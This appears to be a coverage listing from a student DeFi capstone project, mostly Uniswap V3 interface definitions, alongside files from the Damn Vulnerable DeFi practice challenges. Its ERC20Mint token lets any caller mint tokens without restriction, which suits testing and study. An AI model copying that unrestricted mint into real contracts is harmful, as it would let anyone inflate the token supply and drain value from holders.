  13 |     |     /// @dev The caller of this method receives a callback in the form of IUniswapV3MintCallback#uniswapV3MintCallback
  14 |     |     /// in which they must pay any token0 or token1 owed for the liquidity. The amount of token0/token1 due depends
  15 |     |     /// on tickLower, tickUpper, the amount of liquidity, and the current price.
  16 |     |     /// @param recipient The address for which the liquidity will be created
  17 |     |     /// @param tickLower The lower tick of the position in which to add liquidity
  18 |     |     /// @param tickUpper The upper tick of the position in which to add liquidity
  19 |     |     /// @param amount The amount of liquidity to mint
  20 |     |     /// @param data Any data that should be passed through to the callback
  21 |     |     /// @return amount0 The amount of token0 that was paid to mint the given amount of liquidity. Matches the value in the callback
  22 |     |     /// @return amount1 The amount of token1 that was paid to mint the given amount of liquidity. Matches the value in the callback
  23 |     |     function mint(
  24 |     |         address recipient,
  25 |     |         int24 tickLower,
  26 |     |         int24 tickUpper,
  27 |     |         uint128 amount,
  28 |     |         bytes calldata data
  29 |     |     ) external returns (uint256 amount0, uint256 amount1);
  30 |     | 
  31 |     |     /// @notice Collects tokens owed to a position
  32 |     |     /// @dev Does not recompute fees earned, which must be done either via mint or burn of any amount of liquidity.
  33 |     |     /// Collect must be called by the position owner. To withdraw only token0 or only token1, amount0Requested or
  34 |     |     /// amount1Requested may be set to zero. To withdraw all tokens owed, caller may pass any value greater than the
  35 |     |     /// actual tokens owed, e.g. type(uint128).max. Tokens owed may be from accumulated swap fees or burned liquidity.
  36 |     |     /// @param recipient The address which should receive the fees collected
  37 |     |     /// @param tickLower The lower tick of the position for which to collect fees
  38 |     |     /// @param tickUpper The upper tick of the position for which to collect fees
  39 |     |     /// @param amount0Requested How much token0 should be withdrawn from the fees owed
  40 |     |     /// @param amount1Requested How much token1 should be withdrawn from the fees owed
  41 |     |     /// @return amount0 The amount of fees collected in token0
  42 |     |     /// @return amount1 The amount of fees collected in token1
  43 |     |     function collect(
  44 |     |         address recipient,
  45 |     |         int24 tickLower,
  46 |     |         int24 tickUpper,
  47 |     |         uint128 amount0Requested,
  48 |     |         uint128 amount1Requested
  49 |     |     ) external returns (uint128 amount0, uint128 amount1);
  50 |     | 
  51 |     |     /// @notice Burn liquidity from the sender and account tokens owed for the liquidity to the position
  52 |     |     /// @dev Can be used to trigger a recalculation of fees owed to a position by calling with an amount of 0
  53 |     |     /// @dev Fees must be collected separately via a call to #collect
  54 |     |     /// @param tickLower The lower tick of the position for which to burn liquidity
  55 |     |     /// @param tickUpper The upper tick of the position for which to burn liquidity
  56 |     |     /// @param amount How much liquidity to burn
  57 |     |     /// @return amount0 The amount of token0 sent to the recipient
  58 |     |     /// @return amount1 The amount of token1 sent to the recipient
  59 |     |     function burn(
  60 |     |         int24 tickLower,
  61 |     |         int24 tickUpper,
  62 |     |         uint128 amount
  63 |     |     ) external returns (uint256 amount0, uint256 amount1);
  64 |     | 
  65 |     |     /// @notice Swap token0 for token1, or token1 for token0
  66 |     |     /// @dev The caller of this method receives a callback in the form of IUniswapV3SwapCallback#uniswapV3SwapCallback
  67 |     |     /// @param recipient The address to receive the output of the swap
  68 |     |     /// @param zeroForOne The direction of the swap, true for token0 to token1, false for token1 to token0
  69 |     |     /// @param amountSpecified The amount of the swap, which implicitly configures the swap as exact input (positive), or exact output (negative)
  70 |     |     /// @param sqrtPriceLimitX96 The Q64.96 sqrt price limit. If zero for one, the price cannot be less than this
  71 |     |     /// value after the swap. If one for zero, the price cannot be greater than this value after the swap
  72 |     |     /// @param data Any data to be passed through to the callback
  73 |     |     /// @return amount0 The delta of the balance of token0 of the pool, exact when negative, minimum when positive
  74 |     |     /// @return amount1 The delta of the balance of token1 of the pool, exact when negative, minimum when positive
  75 |     |     function swap(
  76 |     |         address recipient,
  77 |     |         bool zeroForOne,
  78 |     |         int256 amountSpecified,
  79 |     |         uint160 sqrtPriceLimitX96,
  80 |     |         bytes calldata data
  81 |     |     ) external returns (int256 amount0, int256 amount1);
  82 |     | 
  83 |     |     /// @notice Receive token0 and/or token1 and pay it back, plus a fee, in the callback
  84 |     |     /// @dev The caller of this method receives a callback in the form of IUniswapV3FlashCallback#uniswapV3FlashCallback
  85 |     |     /// @dev Can be used to donate underlying tokens pro-rata to currently in-range liquidity providers by calling
  86 |     |     /// with 0 amount{0,1} and sending the donation amount(s) from the callback
  87 |     |     /// @param recipient The address which will receive the token0 and token1 amounts
  88 |     |     /// @param amount0 The amount of token0 to send
  89 |     |     /// @param amount1 The amount of token1 to send
  90 |     |     /// @param data Any data to be passed through to the callback
  91 |     |     function flash(
  92 |     |         address recipient,
  93 |     |         uint256 amount0,
  94 |     |         uint256 amount1,
  95 |     |         bytes calldata data
  96 |     |     ) external;
  97 |     | 
  98 |     |     /// @notice Increase the maximum number of price and liquidity observations that this pool will store
  99 |     |     /// @dev This method is no-op if the pool already has an observationCardinalityNext greater than or equal to
 100 |     |     /// the input observationCardinalityNext.
 101 |     |     /// @param observationCardinalityNext The desired minimum number of observations for the pool to store
 102 |     |     function increaseObservationCardinalityNext(uint16 observationCardinalityNext) external;
 103 |     | }
 104 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/pool/IUniswapV3PoolDerivedState.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.5.0;
  3 |     | 
  4 |     | /// @title Pool state that is not stored
  5 |     | /// @notice Contains view functions to provide information about the pool that is computed rather than stored on the
  6 |     | /// blockchain. The functions here may have variable gas costs.
  7 |     | interface IUniswapV3PoolDerivedState {
  8 |     |     /// @notice Returns the cumulative tick and liquidity as of each timestamp `secondsAgo` from the current block timestamp
  9 |     |     /// @dev To get a time weighted average tick or liquidity-in-range, you must call this with two values, one representing
 10 |     |     /// the beginning of the period and another for the end of the period. E.g., to get the last hour time-weighted average tick,
 11 |     |     /// you must call it with secondsAgos = [3600, 0].
 12 |     |     /// @dev The time weighted average tick represents the geometric time weighted average price of the pool, in
 13 |     |     /// log base sqrt(1.0001) of token1 / token0. The TickMath library can be used to go from a tick value to a ratio.
 14 |     |     /// @param secondsAgos From how long ago each cumulative tick and liquidity value should be returned
 15 |     |     /// @return tickCumulatives Cumulative tick values as of each `secondsAgos` from the current block timestamp
 16 |     |     /// @return secondsPerLiquidityCumulativeX128s Cumulative seconds per liquidity-in-range value as of each `secondsAgos` from the current block
 17 |     |     /// timestamp
 18 |     |     function observe(uint32[] calldata secondsAgos)
 19 |     |         external
 20 |     |         view
 21 |     |         returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s);
 22 |     | 
 23 |     |     /// @notice Returns a snapshot of the tick cumulative, seconds per liquidity and seconds inside a tick range
 24 |     |     /// @dev Snapshots must only be compared to other snapshots, taken over a period for which a position existed.
 25 |     |     /// I.e., snapshots cannot be compared if a position is not held for the entire period between when the first
 26 |     |     /// snapshot is taken and the second snapshot is taken.
 27 |     |     /// @param tickLower The lower tick of the range
 28 |     |     /// @param tickUpper The upper tick of the range
 29 |     |     /// @return tickCumulativeInside The snapshot of the tick accumulator for the range
 30 |     |     /// @return secondsPerLiquidityInsideX128 The snapshot of seconds per liquidity for the range
 31 |     |     /// @return secondsInside The snapshot of seconds per liquidity for the range
 32 |     |     function snapshotCumulativesInside(int24 tickLower, int24 tickUpper)
 33 |     |         external
 34 |     |         view
 35 |     |         returns (
 36 |     |             int56 tickCumulativeInside,
 37 |     |             uint160 secondsPerLiquidityInsideX128,
 38 |     |             uint32 secondsInside
 39 |     |         );
 40 |     | }
 41 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/pool/IUniswapV3PoolEvents.sol
   1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
   2 |     | pragma solidity >=0.5.0;
   3 |     | 
   4 |     | /// @title Events emitted by a pool
   5 |     | /// @notice Contains all events emitted by the pool
   6 |     | interface IUniswapV3PoolEvents {
   7 |     |     /// @notice Emitted exactly once by a pool when #initialize is first called on the pool
   8 |     |     /// @dev Mint/Burn/Swap cannot be emitted by the pool before Initialize
   9 |     |     /// @param sqrtPriceX96 The initial sqrt price of the pool, as a Q64.96
  10 |     |     /// @param tick The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool
  11 |     |     event Initialize(uint160 sqrtPriceX96, int24 tick);
  12 |     | 
  13 |     |     /// @notice Emitted when liquidity is minted for a given position
  14 |     |     /// @param sender The address that minted the liquidity
  15 |     |     /// @param owner The owner of the position and recipient of any minted liquidity
  16 |     |     /// @param tickLower The lower tick of the position
  17 |     |     /// @param tickUpper The upper tick of the position
  18 |     |     /// @param amount The amount of liquidity minted to the position range
  19 |     |     /// @param amount0 How much token0 was required for the minted liquidity
  20 |     |     /// @param amount1 How much token1 was required for the minted liquidity
  21 |     |     event Mint(
  22 |     |         address sender,
  23 |     |         address indexed owner,
  24 |     |         int24 indexed tickLower,
  25 |     |         int24 indexed tickUpper,
  26 |     |         uint128 amount,
  27 |     |         uint256 amount0,
  28 |     |         uint256 amount1
  29 |     |     );
  30 |     | 
  31 |     |     /// @notice Emitted when fees are collected by the owner of a position
  32 |     |     /// @dev Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees
  33 |     |     /// @param owner The owner of the position for which fees are collected
  34 |     |     /// @param tickLower The lower tick of the position
  35 |     |     /// @param tickUpper The upper tick of the position
  36 |     |     /// @param amount0 The amount of token0 fees collected
  37 |     |     /// @param amount1 The amount of token1 fees collected
  38 |     |     event Collect(
  39 |     |         address indexed owner,
  40 |     |         address recipient,
  41 |     |         int24 indexed tickLower,
  42 |     |         int24 indexed tickUpper,
  43 |     |         uint128 amount0,
  44 |     |         uint128 amount1
  45 |     |     );
  46 |     | 
  47 |     |     /// @notice Emitted when a position's liquidity is removed
  48 |     |     /// @dev Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect
  49 |     |     /// @param owner The owner of the position for which liquidity is removed
  50 |     |     /// @param tickLower The lower tick of the position
  51 |     |     /// @param tickUpper The upper tick of the position
  52 |     |     /// @param amount The amount of liquidity to remove
  53 |     |     /// @param amount0 The amount of token0 withdrawn
  54 |     |     /// @param amount1 The amount of token1 withdrawn
  55 |     |     event Burn(
  56 |     |         address indexed owner,
  57 |     |         int24 indexed tickLower,
  58 |     |         int24 indexed tickUpper,
  59 |     |         uint128 amount,
  60 |     |         uint256 amount0,
  61 |     |         uint256 amount1
  62 |     |     );
  63 |     | 
  64 |     |     /// @notice Emitted by the pool for any swaps between token0 and token1
  65 |     |     /// @param sender The address that initiated the swap call, and that received the callback
  66 |     |     /// @param recipient The address that received the output of the swap
  67 |     |     /// @param amount0 The delta of the token0 balance of the pool
  68 |     |     /// @param amount1 The delta of the token1 balance of the pool
  69 |     |     /// @param sqrtPriceX96 The sqrt(price) of the pool after the swap, as a Q64.96
  70 |     |     /// @param liquidity The liquidity of the pool after the swap
  71 |     |     /// @param tick The log base 1.0001 of price of the pool after the swap
  72 |     |     event Swap(
  73 |     |         address indexed sender,
  74 |     |         address indexed recipient,
  75 |     |         int256 amount0,
  76 |     |         int256 amount1,
  77 |     |         uint160 sqrtPriceX96,
  78 |     |         uint128 liquidity,
  79 |     |         int24 tick
  80 |     |     );
  81 |     | 
  82 |     |     /// @notice Emitted by the pool for any flashes of token0/token1
  83 |     |     /// @param sender The address that initiated the swap call, and that received the callback
  84 |     |     /// @param recipient The address that received the tokens from flash
  85 |     |     /// @param amount0 The amount of token0 that was flashed
  86 |     |     /// @param amount1 The amount of token1 that was flashed
  87 |     |     /// @param paid0 The amount of token0 paid for the flash, which can exceed the amount0 plus the fee
  88 |     |     /// @param paid1 The amount of token1 paid for the flash, which can exceed the amount1 plus the fee
  89 |     |     event Flash(
  90 |     |         address indexed sender,
  91 |     |         address indexed recipient,
  92 |     |         uint256 amount0,
  93 |     |         uint256 amount1,
  94 |     |         uint256 paid0,
  95 |     |         uint256 paid1
  96 |     |     );
  97 |     | 
  98 |     |     /// @notice Emitted by the pool for increases to the number of observations that can be stored
  99 |     |     /// @dev observationCardinalityNext is not the observation cardinality until an observation is written at the index
 100 |     |     /// just before a mint/swap/burn.
 101 |     |     /// @param observationCardinalityNextOld The previous value of the next observation cardinality
 102 |     |     /// @param observationCardinalityNextNew The updated value of the next observation cardinality
 103 |     |     event IncreaseObservationCardinalityNext(
 104 |     |         uint16 observationCardinalityNextOld,
 105 |     |         uint16 observationCardinalityNextNew
 106 |     |     );
 107 |     | 
 108 |     |     /// @notice Emitted when the protocol fee is changed by the pool
 109 |     |     /// @param feeProtocol0Old The previous value of the token0 protocol fee
 110 |     |     /// @param feeProtocol1Old The previous value of the token1 protocol fee
 111 |     |     /// @param feeProtocol0New The updated value of the token0 protocol fee
 112 |     |     /// @param feeProtocol1New The updated value of the token1 protocol fee
 113 |     |     event SetFeeProtocol(uint8 feeProtocol0Old, uint8 feeProtocol1Old, uint8 feeProtocol0New, uint8 feeProtocol1New);
 114 |     | 
 115 |     |     /// @notice Emitted when the collected protocol fees are withdrawn by the factory owner
 116 |     |     /// @param sender The address that collects the protocol fees
 117 |     |     /// @param recipient The address that receives the collected protocol fees
 118 |     |     /// @param amount0 The amount of token0 protocol fees that is withdrawn
 119 |     |     /// @param amount0 The amount of token1 protocol fees that is withdrawn
 120 |     |     event CollectProtocol(address indexed sender, address indexed recipient, uint128 amount0, uint128 amount1);
 121 |     | }
 122 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.5.0;
  3 |     | 
  4 |     | /// @title Pool state that never changes
  5 |     | /// @notice These parameters are fixed for a pool forever, i.e., the methods will always return the same values
  6 |     | interface IUniswapV3PoolImmutables {
  7 |     |     /// @notice The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface
  8 |     |     /// @return The contract address
  9 |     |     function factory() external view returns (address);
 10 |     | 
 11 |     |     /// @notice The first of the two tokens of the pool, sorted by address
 12 |     |     /// @return The token contract address
 13 |     |     function token0() external view returns (address);
 14 |     | 
 15 |     |     /// @notice The second of the two tokens of the pool, sorted by address
 16 |     |     /// @return The token contract address
 17 |     |     function token1() external view returns (address);
 18 |     | 
 19 |     |     /// @notice The pool's fee in hundredths of a bip, i.e. 1e-6
 20 |     |     /// @return The fee
 21 |     |     function fee() external view returns (uint24);
 22 |     | 
 23 |     |     /// @notice The pool tick spacing
 24 |     |     /// @dev Ticks can only be used at multiples of this value, minimum of 1 and always positive
 25 |     |     /// e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ...
 26 |     |     /// This value is an int24 to avoid casting even though it is always positive.
 27 |     |     /// @return The tick spacing
 28 |     |     function tickSpacing() external view returns (int24);
 29 |     | 
 30 |     |     /// @notice The maximum amount of position liquidity that can use any tick in the range
 31 |     |     /// @dev This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and
 32 |     |     /// also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool
 33 |     |     /// @return The max amount of liquidity per tick
 34 |     |     function maxLiquidityPerTick() external view returns (uint128);
 35 |     | }
 36 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.5.0;
  3 |     | 
  4 |     | /// @title Permissioned pool actions
  5 |     | /// @notice Contains pool methods that may only be called by the factory owner
  6 |     | interface IUniswapV3PoolOwnerActions {
  7 |     |     /// @notice Set the denominator of the protocol's % share of the fees
  8 |     |     /// @param feeProtocol0 new protocol fee for token0 of the pool
  9 |     |     /// @param feeProtocol1 new protocol fee for token1 of the pool
 10 |     |     function setFeeProtocol(uint8 feeProtocol0, uint8 feeProtocol1) external;
 11 |     | 
 12 |     |     /// @notice Collect the protocol fee accrued to the pool
 13 |     |     /// @param recipient The address to which collected protocol fees should be sent
 14 |     |     /// @param amount0Requested The maximum amount of token0 to send, can be 0 to collect fees in only token1
 15 |     |     /// @param amount1Requested The maximum amount of token1 to send, can be 0 to collect fees in only token0
 16 |     |     /// @return amount0 The protocol fee collected in token0
 17 |     |     /// @return amount1 The protocol fee collected in token1
 18 |     |     function collectProtocol(
 19 |     |         address recipient,
 20 |     |         uint128 amount0Requested,
 21 |     |         uint128 amount1Requested
 22 |     |     ) external returns (uint128 amount0, uint128 amount1);
 23 |     | }
 24 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/interfaces/pool/IUniswapV3PoolState.sol
   1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
   2 |     | pragma solidity >=0.5.0;
   3 |     | 
   4 |     | /// @title Pool state that can change
   5 |     | /// @notice These methods compose the pool's state, and can change with any frequency including multiple times
   6 |     | /// per transaction
   7 |     | interface IUniswapV3PoolState {
   8 |     |     /// @notice The 0th storage slot in the pool stores many values, and is exposed as a single method to save gas
   9 |     |     /// when accessed externally.
  10 |     |     /// @return sqrtPriceX96 The current price of the pool as a sqrt(token1/token0) Q64.96 value
  11 |     |     /// tick The current tick of the pool, i.e. according to the last tick transition that was run.
  12 |     |     /// This value may not always be equal to SqrtTickMath.getTickAtSqrtRatio(sqrtPriceX96) if the price is on a tick
  13 |     |     /// boundary.
  14 |     |     /// observationIndex The index of the last oracle observation that was written,
  15 |     |     /// observationCardinality The current maximum number of observations stored in the pool,
  16 |     |     /// observationCardinalityNext The next maximum number of observations, to be updated when the observation.
  17 |     |     /// feeProtocol The protocol fee for both tokens of the pool.
  18 |     |     /// Encoded as two 4 bit values, where the protocol fee of token1 is shifted 4 bits and the protocol fee of token0
  19 |     |     /// is the lower 4 bits. Used as the denominator of a fraction of the swap fee, e.g. 4 means 1/4th of the swap fee.
  20 |     |     /// unlocked Whether the pool is currently locked to reentrancy
  21 |     |     function slot0()
  22 |     |         external
  23 |     |         view
  24 |     |         returns (
  25 |     |             uint160 sqrtPriceX96,
  26 |     |             int24 tick,
  27 |     |             uint16 observationIndex,
  28 |     |             uint16 observationCardinality,
  29 |     |             uint16 observationCardinalityNext,
  30 |     |             uint8 feeProtocol,
  31 |     |             bool unlocked
  32 |     |         );
  33 |     | 
  34 |     |     /// @notice The fee growth as a Q128.128 fees of token0 collected per unit of liquidity for the entire life of the pool
  35 |     |     /// @dev This value can overflow the uint256
  36 |     |     function feeGrowthGlobal0X128() external view returns (uint256);
  37 |     | 
  38 |     |     /// @notice The fee growth as a Q128.128 fees of token1 collected per unit of liquidity for the entire life of the pool
  39 |     |     /// @dev This value can overflow the uint256
  40 |     |     function feeGrowthGlobal1X128() external view returns (uint256);
  41 |     | 
  42 |     |     /// @notice The amounts of token0 and token1 that are owed to the protocol
  43 |     |     /// @dev Protocol fees will never exceed uint128 max in either token
  44 |     |     function protocolFees() external view returns (uint128 token0, uint128 token1);
  45 |     | 
  46 |     |     /// @notice The currently in range liquidity available to the pool
  47 |     |     /// @dev This value has no relationship to the total liquidity across all ticks
  48 |     |     function liquidity() external view returns (uint128);
  49 |     | 
  50 |     |     /// @notice Look up information about a specific tick in the pool
  51 |     |     /// @param tick The tick to look up
  52 |     |     /// @return liquidityGross the total amount of position liquidity that uses the pool either as tick lower or
  53 |     |     /// tick upper,
  54 |     |     /// liquidityNet how much liquidity changes when the pool price crosses the tick,
  55 |     |     /// feeGrowthOutside0X128 the fee growth on the other side of the tick from the current tick in token0,
  56 |     |     /// feeGrowthOutside1X128 the fee growth on the other side of the tick from the current tick in token1,
  57 |     |     /// tickCumulativeOutside the cumulative tick value on the other side of the tick from the current tick
  58 |     |     /// secondsPerLiquidityOutsideX128 the seconds spent per liquidity on the other side of the tick from the current tick,
  59 |     |     /// secondsOutside the seconds spent on the other side of the tick from the current tick,
  60 |     |     /// initialized Set to true if the tick is initialized, i.e. liquidityGross is greater than 0, otherwise equal to false.
  61 |     |     /// Outside values can only be used if the tick is initialized, i.e. if liquidityGross is greater than 0.
  62 |     |     /// In addition, these values are only relative and must be used only in comparison to previous snapshots for
  63 |     |     /// a specific position.
  64 |     |     function ticks(int24 tick)
  65 |     |         external
  66 |     |         view
  67 |     |         returns (
  68 |     |             uint128 liquidityGross,
  69 |     |             int128 liquidityNet,
  70 |     |             uint256 feeGrowthOutside0X128,
  71 |     |             uint256 feeGrowthOutside1X128,
  72 |     |             int56 tickCumulativeOutside,
  73 |     |             uint160 secondsPerLiquidityOutsideX128,
  74 |     |             uint32 secondsOutside,
  75 |     |             bool initialized
  76 |     |         );
  77 |     | 
  78 |     |     /// @notice Returns 256 packed tick initialized boolean values. See TickBitmap for more information
  79 |     |     function tickBitmap(int16 wordPosition) external view returns (uint256);
  80 |     | 
  81 |     |     /// @notice Returns the information about a position by the position's key
  82 |     |     /// @param key The position's key is a hash of a preimage composed by the owner, tickLower and tickUpper
  83 |     |     /// @return _liquidity The amount of liquidity in the position,
  84 |     |     /// Returns feeGrowthInside0LastX128 fee growth of token0 inside the tick range as of the last mint/burn/poke,
  85 |     |     /// Returns feeGrowthInside1LastX128 fee growth of token1 inside the tick range as of the last mint/burn/poke,
  86 |     |     /// Returns tokensOwed0 the computed amount of token0 owed to the position as of the last mint/burn/poke,
  87 |     |     /// Returns tokensOwed1 the computed amount of token1 owed to the position as of the last mint/burn/poke
  88 |     |     function positions(bytes32 key)
  89 |     |         external
  90 |     |         view
  91 |     |         returns (
  92 |     |             uint128 _liquidity,
  93 |     |             uint256 feeGrowthInside0LastX128,
  94 |     |             uint256 feeGrowthInside1LastX128,
  95 |     |             uint128 tokensOwed0,
  96 |     |             uint128 tokensOwed1
  97 |     |         );
  98 |     | 
  99 |     |     /// @notice Returns data about a specific observation index
 100 |     |     /// @param index The element of the observations array to fetch
 101 |     |     /// @dev You most likely want to use #observe() instead of this method to get an observation as of some amount of time
 102 |     |     /// ago, rather than at a specific index in the array.
 103 |     |     /// @return blockTimestamp The timestamp of the observation,
 104 |     |     /// Returns tickCumulative the tick multiplied by seconds elapsed for the life of the pool as of the observation timestamp,
 105 |     |     /// Returns secondsPerLiquidityCumulativeX128 the seconds per in range liquidity for the life of the pool as of the observation timestamp,
 106 |     |     /// Returns initialized whether the observation has been initialized and the values are safe to use
 107 |     |     function observations(uint256 index)
 108 |     |         external
 109 |     |         view
 110 |     |         returns (
 111 |     |             uint32 blockTimestamp,
 112 |     |             int56 tickCumulative,
 113 |     |             uint160 secondsPerLiquidityCumulativeX128,
 114 |     |             bool initialized
 115 |     |         );
 116 |     | }
 117 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-core/contracts/libraries/TransferHelper.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.6.0;
  3 |     | 
  4 |     | import '../interfaces/IERC20Minimal.sol';
  5 |     | 
  6 |     | /// @title TransferHelper
  7 |     | /// @notice Contains helper methods for interacting with ERC20 tokens that do not consistently return true/false
  8 |     | library TransferHelper {
  9 |     |     /// @notice Transfers tokens from msg.sender to a recipient
 10 |     |     /// @dev Calls transfer on token contract, errors with TF if transfer fails
 11 |     |     /// @param token The contract address of the token which will be transferred
 12 |     |     /// @param to The recipient of the transfer
 13 |     |     /// @param value The value of the transfer
 14 | *   |     function safeTransfer(
 15 |     |         address token,
 16 |     |         address to,
 17 |     |         uint256 value
 18 | *   |     ) internal {
 19 | *   |         (bool success, bytes memory data) =
 20 | *   |             token.call(abi.encodeWithSelector(IERC20Minimal.transfer.selector, to, value));
 21 | *   |         require(success && (data.length == 0 || abi.decode(data, (bool))), 'TF');
 22 |     |     }
 23 |     | }
 24 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v3-periphery/contracts/interfaces/ISwapRouter.sol
  1 |     | // SPDX-License-Identifier: GPL-2.0-or-later
  2 |     | pragma solidity >=0.7.5;
  3 |     | pragma abicoder v2;
  4 |     | 
  5 |     | import '@uniswap/v3-core/contracts/interfaces/callback/IUniswapV3SwapCallback.sol';
  6 |     | 
  7 |     | /// @title Router token swapping functionality
  8 |     | /// @notice Functions for swapping tokens via Uniswap V3
  9 |     | interface ISwapRouter is IUniswapV3SwapCallback {
 10 |     |     struct ExactInputSingleParams {
 11 |     |         address tokenIn;
 12 |     |         address tokenOut;
 13 |     |         uint24 fee;
 14 |     |         address recipient;
 15 |     |         uint256 deadline;
 16 |     |         uint256 amountIn;
 17 |     |         uint256 amountOutMinimum;
 18 |     |         uint160 sqrtPriceLimitX96;
 19 |     |     }
 20 |     | 
 21 |     |     /// @notice Swaps `amountIn` of one token for as much as possible of another token
 22 |     |     /// @param params The parameters necessary for the swap, encoded as `ExactInputSingleParams` in calldata
 23 |     |     /// @return amountOut The amount of the received token
 24 |     |     function exactInputSingle(ExactInputSingleParams calldata params) external payable returns (uint256 amountOut);
 25 |     | 
 26 |     |     struct ExactInputParams {
 27 |     |         bytes path;
 28 |     |         address recipient;
 29 |     |         uint256 deadline;
 30 |     |         uint256 amountIn;
 31 |     |         uint256 amountOutMinimum;
 32 |     |     }
 33 |     | 
 34 |     |     /// @notice Swaps `amountIn` of one token for as much as possible of another along the specified path
 35 |     |     /// @param params The parameters necessary for the multi-hop swap, encoded as `ExactInputParams` in calldata
 36 |     |     /// @return amountOut The amount of the received token
 37 |     |     function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
 38 |     | 
 39 |     |     struct ExactOutputSingleParams {
 40 |     |         address tokenIn;
 41 |     |         address tokenOut;
 42 |     |         uint24 fee;
 43 |     |         address recipient;
 44 |     |         uint256 deadline;
 45 |     |         uint256 amountOut;
 46 |     |         uint256 amountInMaximum;
 47 |     |         uint160 sqrtPriceLimitX96;
 48 |     |     }
 49 |     | 
 50 |     |     /// @notice Swaps as little as possible of one token for `amountOut` of another token
 51 |     |     /// @param params The parameters necessary for the swap, encoded as `ExactOutputSingleParams` in calldata
 52 |     |     /// @return amountIn The amount of the input token
 53 |     |     function exactOutputSingle(ExactOutputSingleParams calldata params) external payable returns (uint256 amountIn);
 54 |     | 
 55 |     |     struct ExactOutputParams {
 56 |     |         bytes path;
 57 |     |         address recipient;
 58 |     |         uint256 deadline;
 59 |     |         uint256 amountOut;
 60 |     |         uint256 amountInMaximum;
 61 |     |     }
 62 |     | 
 63 |     |     /// @notice Swaps as little as possible of one token for `amountOut` of another along the specified path (reversed)
 64 |     |     /// @param params The parameters necessary for the multi-hop swap, encoded as `ExactOutputParams` in calldata
 65 |     |     /// @return amountIn The amount of the input token
 66 |     |     function exactOutput(ExactOutputParams calldata params) external payable returns (uint256 amountIn);
 67 |     | }
 68 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/exchange/ERC20Mint.sol
  1 |     | // SPDX-License-Identifier: MIT
  2 |     | pragma solidity ^0.8.19;
  3 |     | 
  4 |     | import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
  5 |     | 
  6 | *r  | contract ERC20Mint is ERC20 {
  7 | *   |     constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}
  8 |     | 
  9 | *   |     function mint(address to, uint256 amount) external {
 10 | *r  |         require(to != address(0), "Invalid mint to zero address");
 11 | *   |         _mint(to, amount);
 12 |     |     }
 13 |     | }
 14 |     | 

/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/puppet-v3/INonfungiblePositionManager.sol
   1 |     | // SPDX-License-Identifier: MIT
   2 |     | // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
   3 |     | pragma solidity ^0.8.20;
   4 |     | 
   5 |     | interface INonfungiblePositionManager {
   6 |     |     struct CollectParams {
   7 |     |         uint256 tokenId;
   8 |     |         address recipient;
   9 |     |         uint128 amount0Max;
  10 |     |         uint128 amount1Max;
  11 |     |     }
  12 |     | 
  13 |     |     struct DecreaseLiquidityParams {
  14 |     |         uint256 tokenId;
  15 |     |         uint128 liquidity;
  16 |     |         uint256 amount0Min;
  17 |     |         uint256 amount1Min;
  18 |     |         uint256 deadline;
  19 |     |     }
  20 |     | 
  21 |     |     struct IncreaseLiquidityParams {
  22 |     |         uint256 tokenId;
  23 |     |         uint256 amount0Desired;
  24 |     |         uint256 amount1Desired;
  25 |     |         uint256 amount0Min;
  26 |     |         uint256 amount1Min;
  27 |     |         uint256 deadline;
  28 |     |     }
  29 |     | 
  30 |     |     struct MintParams {
  31 |     |         address token0;
  32 |     |         address token1;
  33 |     |         uint24 fee;
  34 |     |         int24 tickLower;
  35 |     |         int24 tickUpper;
  36 |     |         uint256 amount0Desired;
  37 |     |         uint256 amount1Desired;
  38 |     |         uint256 amount0Min;
  39 |     |         uint256 amount1Min;
  40 |     |         address recipient;
  41 |     |         uint256 deadline;
  42 |     |     }
  43 |     | 
  44 |     |     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
  45 |     |     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
  46 |     |     event Collect(uint256 indexed tokenId, address recipient, uint256 amount0, uint256 amount1);
  47 |     |     event DecreaseLiquidity(uint256 indexed tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
  48 |     |     event IncreaseLiquidity(uint256 indexed tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);
  49 |     |     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
  50 |     | 
  51 |     |     receive() external payable;
  52 |     | 
  53 |     |     function DOMAIN_SEPARATOR() external view returns (bytes32);
  54 |     |     function PERMIT_TYPEHASH() external view returns (bytes32);
  55 |     |     function WETH9() external view returns (address);
  56 |     |     function approve(address to, uint256 tokenId) external;
  57 |     |     function balanceOf(address owner) external view returns (uint256);
